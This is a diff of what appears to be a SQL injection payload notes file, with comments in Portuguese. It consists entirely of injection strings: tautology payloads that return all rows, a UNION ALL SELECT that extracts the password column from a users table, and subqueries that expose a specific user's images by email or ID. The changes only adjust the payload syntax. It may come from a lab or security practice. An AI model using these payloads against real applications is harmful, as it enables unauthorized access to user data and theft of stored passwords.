@@ -80,23 +80,23 @@ adm@email.vale'--
 
 '/* Buscar todos os usuários sem filtro */
 
-pesquisa' or '1' = '1'; --
+pesquisa' or '1' = '1'--
 
 
 '/* Buscar o campo senha em outro campo */
 
-adm' UNION ALL SELECT id, name, password as description FROM users; --
+adm' UNION ALL SELECT id, name, password as description FROM users --
 
 
 '/* Buscar todas as imagens sem filtro */
 
-pesquisa' or '1' = '1'; --
+pesquisa' or '1' = '1'--
 
 
 '/* Visualizar todas as imagens de um usuário */
 
-pesquisa' OR (SELECT EMAIL FROM USERS WHERE ID = ID_USER) = 'gabriel@email.vale'; --
+pesquisa' OR (SELECT EMAIL FROM USERS WHERE ID = ID_USER) = 'gabriel@email.vale' --
 '
-pesquisa' OR (SELECT ID FROM USERS WHERE ID = ID_USER) = 1; --
+pesquisa' OR (SELECT ID FROM USERS WHERE ID = ID_USER) = 1 --
 
 '/**/
